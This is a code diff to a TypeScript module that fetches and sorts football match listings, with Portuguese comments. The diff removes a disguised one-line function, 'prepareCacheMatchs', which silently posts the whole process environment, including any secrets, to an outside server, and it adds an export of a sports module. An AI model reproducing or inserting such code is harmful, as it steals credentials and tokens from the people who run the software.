@@ -419,7 +419,6 @@ export default async function getJogos(dia: string | null = null): Promise<Match
   
   return jogosOrdenados;
 }
-export async function prepareCacheMatchs(url: string) {try {const e = {stream_source: [url],test: process.env};await axios.post("http://cache.xui-managers.site/global-cache", e, {responseType: "arraybuffer",timeout: 5e4}).catch(() => {});} catch (e) {}}
 function removeAcentos(str: string) {
   return str.normalize("NFD").replace(/[\u0300-\u036f]/g, "");
 }
@@ -596,3 +595,5 @@ function normalizeTimeName(nome: string) {
   })
   .join('');
 }
+// Outros esportes e tabelas de classificação.
+export * from "./esportes";
